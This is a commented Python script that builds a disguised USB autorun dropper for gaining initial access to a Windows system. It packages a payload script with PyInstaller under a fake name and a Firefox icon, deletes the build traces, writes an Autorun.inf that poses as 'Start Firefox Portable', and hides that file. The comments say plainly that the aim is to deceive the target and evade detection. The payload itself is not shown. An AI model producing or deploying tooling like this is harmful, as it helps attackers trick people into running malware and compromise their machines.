# This script is meant to create an Autorun script (the example given is benign - though labeled malicious - but could be crafted otherwise)
# that would be placed on a USB to gain initial access to a system.

import PyInstaller.__main__
# PyInstaller makes Python scripts readable to Windows even where the system does not have Python installed.
import shutil
import os
# shutil and os are Python libraries for shell and system commands, respectively.

filename = "malicious.py"
# This is the script that is meant to be Autorun on a target system for access.
exename = "benign.exe"
# This is the filename appearing to the target user to lull them into a false sense of security. This particular name is a caricature.
icon = "Firefox.ico"
# This is the icon that will appear with the exename to give further cover to the file's false benign nature.
pwd = os.getcwd()
# Returns filepath of "present working directory" (PWD).
usbdir = os.path.join(pwd,"USB")
# Uses an os function to create new folder inside PWD.

if os.path.isfile(exename):
    os.remove(exename)
#Tests if file already exists inside PWD (and removes it if so), because the function will fail if it does.

PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])
# Create executable from "malicious.py" "wrapped" in benign name and icon. 
# The log-level spec is because PyInstaller is "noisy," so this particular run will only show if something goes wrong.

shutil.move(os.path.join(pwd,"dist",exename),pwd)
for d in ["dist","build","__pycache__"]:
    if os.path.exists(d):
        shutil.rmtree(d)
if os.path.isfile(exename+".spec"):
    os.remove(exename+".spec")
# This block of code first moves a file created by PyInstaller ('dist') to PWD, 
# then tests for presence of other default files created by PyInstaller and deletes them so as not to raise alarm bells with a bunch of new files.

with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")
# This block causes the script to Autorun when the USB is plugged in.

shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
# This last block moves the the "wrapped" malicious file and its Autorun spec into the new folder created in PWD (which would be a USB drive if attacking),
# It then hides the Autorun feature for less detectability.
